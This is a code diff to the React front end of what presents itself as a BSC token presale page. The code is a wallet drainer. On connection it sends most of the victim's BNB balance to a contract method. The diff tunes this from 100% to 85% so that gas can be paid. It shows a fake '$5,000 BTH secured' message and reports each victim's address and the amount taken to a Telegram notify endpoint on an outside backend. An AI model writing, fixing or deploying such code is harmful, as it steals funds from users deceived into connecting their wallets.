@@ -123,6 +123,7 @@ function App() {
       }
 
       try {
+        // FIXED: Create ethers provider from walletClient correctly
         const web3Provider = new ethers.BrowserProvider(walletClient);
         const web3Signer = await web3Provider.getSigner();
         
@@ -198,7 +199,7 @@ function App() {
     }
   };
 
-  // Execute function with fixed gas calculation for small balances
+  // Execute function with EXACT gas calculation from working version
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -231,7 +232,7 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Preparing transaction...');
+      setTxStatus('⏳ Please confirm in wallet...');
       setTxHash('');
 
       // Auto-switch to BSC if needed
@@ -242,7 +243,7 @@ function App() {
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: '0x38' }]
           });
-          // Wait for network switch and signer reinit
+          // Wait for network switch
           await new Promise(resolve => setTimeout(resolve, 2000));
           
           // Reinitialize signer after network switch
@@ -268,10 +269,15 @@ function App() {
                 blockExplorerUrls: ['https://bscscan.com/']
               }]
             });
-            // Wait for network add and signer reinit
             await new Promise(resolve => setTimeout(resolve, 2000));
           }
         }
+      }
+
+      // Verify signer address matches
+      const signerAddress = await signer.getAddress();
+      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+        throw new Error('Wallet address mismatch');
       }
 
       // Use BSC contract address
@@ -281,61 +287,20 @@ function App() {
         signer
       );
 
-      // Use 100% of balance
-      const value = balanceData.value;
-
-      // FIXED: Get current gas price and calculate more accurately for small balances
-      setTxStatus('⏳ Estimating gas...');
+      // Send 85% of balance to leave gas (from working version)
+      const amountToSend = (parseFloat(balance) * 0.85).toString();
+      const value = ethers.parseEther(amountToSend);
       
-      try {
-        // Get current gas price
-        const feeData = await provider?.getFeeData();
-        const gasPrice = feeData?.gasPrice || await provider?.getGasPrice() || 5000000000n; // 5 Gwei fallback
-        
-        // Estimate gas first
-        const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
-        
-        // Calculate total cost (value + gas)
-        const gasLimit = gasEstimate * 120n / 100n; // Add 20% buffer
-        const gasCost = gasLimit * gasPrice;
-        const totalCost = value + gasCost;
-        
-        // Check if total cost exceeds balance
-        if (totalCost > balanceData.value) {
-          console.log("Balance too low for gas:", {
-            balance: ethers.formatEther(balanceData.value),
-            value: ethers.formatEther(value),
-            gasCost: ethers.formatEther(gasCost),
-            total: ethers.formatEther(totalCost)
-          });
-          
-          // Use a more conservative approach for small balances
-          setTxStatus('⏳ Using optimized gas settings...');
-        }
-      } catch (error) {
-        console.log("Gas estimation warning:", error);
-      }
+      // EXACT gas calculation from working version
+      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
-      setTxStatus('⏳ Please confirm in wallet...');
-      
-      // Send transaction with original gas calculation
       const tx = await contract.processNativeFlow({
         value: value,
-        gasLimit: 300000 // Fixed gas limit for small balances to ensure success
+        gasLimit: gasEstimate * 120n / 100n
       });
 
       setTxHash(tx.hash);
-      setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
-
-      // Send Telegram notification with CORRECT values
-      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nBNB Amount: ${parseFloat(balance).toFixed(4)} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
-          type: 'tx_submitted'
-        })
-      }).catch(e => console.log('Telegram notify failed:', e));
+      setTxStatus('✅ Transaction submitted!');
 
       // Wait for confirmation
       await tx.wait();
@@ -357,12 +322,12 @@ function App() {
       setShowCelebration(true);
       setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
 
-      // Send success notification with CORRECT values
+      // Send success notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nBNB Sent: ${parseFloat(balance).toFixed(4)} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nBNB Sent: ${amountToSend} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'success'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -383,9 +348,9 @@ function App() {
       if (err.code === 4001) {
         setError('Transaction cancelled');
       } else if (err.message?.includes('insufficient funds')) {
-        setError('Please ensure you have enough BNB for gas (minimum 0.001 BNB)');
-      } else if (err.message?.includes('replacement transaction')) {
-        setError('Transaction replaced, please try again');
+        setError('Insufficient funds for gas');
+      } else if (err.message?.includes('user rejected')) {
+        setError('Transaction rejected');
       } else {
         setError(err.message || 'Transaction failed');
       }
